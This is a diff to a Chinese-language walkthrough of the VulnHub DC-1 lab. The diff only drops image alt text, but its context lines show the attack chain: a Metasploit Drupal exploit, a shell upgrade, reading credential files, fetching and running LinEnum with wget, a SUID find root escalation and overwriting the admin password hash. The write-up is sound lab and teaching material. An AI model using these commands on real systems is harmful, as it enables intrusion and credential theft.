@@ -53,7 +53,7 @@ Beginners may encounter challenges that they have never come across previously, 
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/1.png)
 
 可见有5个结果，去除网关和 kali 和 VM 主机以外 `192.168.141.135` 就是目标了
 
@@ -161,7 +161,7 @@ set RHOSTS 192.168.141.135
 run
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/2.png)
 
 可以看到成功弹回一个会话,这里使用 exploit/unix/webapp/drupal_drupalgeddon2 这个模块也可以成功,就不一一展示了
 
@@ -170,7 +170,7 @@ run
 shell
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/3.png)
 
 这狗日的回显执行命令真是麻烦,咱给他再整个正常交互式的 shell
 ```bash
@@ -178,7 +178,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/4.png)
 
 ok,现在有了一个 www-data 用户的权限，下面开始按照描述中的找那5个 flag 文件
 
@@ -191,7 +191,7 @@ ok,现在有了一个 www-data 用户的权限，下面开始按照描述中的�
 find / -name flag*
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/5.png)
 
 什么鬼,当前目录下就有1个，欸不对，怎么只找到1个，是权限不够吗，可恶啊 (╯‵□′)╯︵┻━┻
 
@@ -218,7 +218,7 @@ cat: sites/all/modules/domain/settings.inc: No such file or directory
 cat sites/default/settings.php
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/6.png)
 
 可以看到 flag2 的内容和 mysql 数据库的账号密码
 ```
@@ -240,7 +240,7 @@ Brute force and dictionary attacks aren't the only ways to gain access (and you 
 mysql -u dbuser -p
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/7.png)
 
 看看数据库看看表
 
@@ -250,7 +250,7 @@ use drupaldb;
 show tables;
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/8.png)
 
 ```
 +-----------------------------+
@@ -379,13 +379,13 @@ pass01.txt 你的密码表
 
 一切准备就绪,run
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/9.png)
 
 只跑出一个 MyPassword,真是不甘心,俺得想想办法,终于,我 google 到了 admin 的密码 53cr3t ,赶紧把它加到我的密码表里
 
 好,admin 的账号密码都有了,那么直接登录,可以看到 dashboard 里就有 flag3
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/10.png)
 
 ```
 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
@@ -405,7 +405,7 @@ passwd 还需要找吗,当我哈批是吧,昂
 cat /etc/passwd
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/11.png)
 
 发现一个 flag4 用户，直接看家目录文件
 ```bash
@@ -444,27 +444,27 @@ git clone https://github.com/rebootuser/LinEnum.git
 python -m SimpleHTTPServer 8080
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/12.png)
 
 ```bash
 wget http://192.168.141.134:8080/LinEnum/LinEnum.sh
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/13.png)
 
 从 kali 上下好后直接运行
 ```bash
 bash LinEnum.sh
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/14.png)
 
 看到 find 没有,今天就让我提个痛快
 ```bash
 find . -exec /bin/sh \; -quit
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/15.png)
 
 ```
 ls /root
@@ -473,7 +473,7 @@ cat /root/thefinalflag.txt
 
 提权成功,感谢靶机作者 @DCUA7,查看最终 flag
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/16.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/16.png)
 
 ---
 
@@ -492,7 +492,7 @@ use drupaldb;
 update users set pass='$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg' where name='admin';
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/17.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/17.png)
 
 ok 登上去了
 
@@ -513,8 +513,8 @@ find / -name drush
 /usr/local/bin/drush user-password admin --password="admin"
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/18.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/18.png)
 
 测试一下,ok 登上去了
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/19.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC1/19.png)
